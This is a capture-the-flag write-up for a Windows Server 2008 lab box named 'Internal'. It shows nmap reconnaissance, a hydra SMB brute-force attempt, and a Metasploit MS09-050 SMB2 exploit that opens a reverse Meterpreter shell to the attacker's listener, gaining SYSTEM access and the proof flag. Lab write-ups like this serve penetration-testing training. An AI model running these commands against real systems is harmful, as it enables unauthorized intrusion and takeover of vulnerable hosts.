# CTF Writeup: Internal

## Lab Description

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.122.40
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 13:20 EDT
Warning: 192.168.122.40 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.122.40
Host is up (0.026s latency).
Not shown: 65102 closed tcp ports (reset), 420 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| rdp-ntlm-info: 
|   Target_Name: INTERNAL
|   NetBIOS_Domain_Name: INTERNAL
|   NetBIOS_Computer_Name: INTERNAL
|   DNS_Domain_Name: internal
|   DNS_Computer_Name: internal
|   Product_Version: 6.0.6001
|_  System_Time: 2025-11-01T17:21:35+00:00
| ssl-cert: Subject: commonName=internal
| Not valid before: 2025-07-24T21:18:58
|_Not valid after:  2026-01-23T21:18:58
|_ssl-date: 2025-11-01T17:21:43+00:00; 0s from scanner time.
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 4 hops
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: internal
|   NetBIOS computer name: INTERNAL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-11-01T10:21:35-07:00
|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s
|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:dd:c6 (VMware)
| smb2-security-mode: 
|   2:0:2: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-11-01T17:21:35
|_  start_date: 2025-07-25T21:18:51

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   27.88 ms 192.168.45.1
2   23.91 ms 192.168.45.254
3   24.03 ms 192.168.251.1
4   25.15 ms 192.168.122.40

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.57 seconds
```

Wasn't able to enumerate any shares on smb.

```
smbclient -L \\\\192.168.122.40\\
Password for [WORKGROUP\root]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.122.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Tried bruteforcing smb 

```
hydra -l user -P /usr/share/wordlists/rockyou.txt smb://192.168.122.40/
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-01 13:27:14
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking smb://192.168.122.40:445/
[STATUS] 726.00 tries/min, 726 tries in 00:01h, 14343673 to do in 329:18h, 1 active
[STATUS] 706.00 tries/min, 2118 tries in 00:03h, 14342281 to do in 338:35h, 1 active
^C^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

Performed Vulnerability Assessment on SMB Windows Server and found RCE.

```
searchsploit Windows Server 2008 SMB
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution  | windows_x86-64/remote/41987.py
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

This exploit seems to not work, let's search up for more using metasploit.

```
msfconsole -q
msf > search type:exploit Microsoft Windows Server 2008
use 91
```

Used the following module and configured it.

```
msf exploit(windows/smb/ms09_050_smb2_negotiate_func_index) >
```

Ran the exploit and gained shell as user "nt authority\system".

```
msf exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > exploit
[*] Started reverse TCP handler on 192.168.45.163:4444 
[*] 192.168.122.40:445 - Connecting to the target (192.168.122.40:445)...
[*] 192.168.122.40:445 - Sending the exploit packet (951 bytes)...
[*] 192.168.122.40:445 - Waiting up to 180 seconds for exploit to trigger...
[*] Sending stage (188998 bytes) to 192.168.122.40
[*] Meterpreter session 1 opened (192.168.45.163:4444 -> 192.168.122.40:49159) at 2025-11-01 14:35:56 -0400

meterpreter > whoami
[-] Unknown command: whoami. Run the help command for more details.
meterpreter > id
[-] Unknown command: id. Run the help command for more details.
meterpreter > shell
Process 2436 created.
Channel 1 created.
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

Retrieved proof.txt in C:\Users\Administrator\Desktop

```
a183917dbb027aa95a47ac07ce05a65f
```
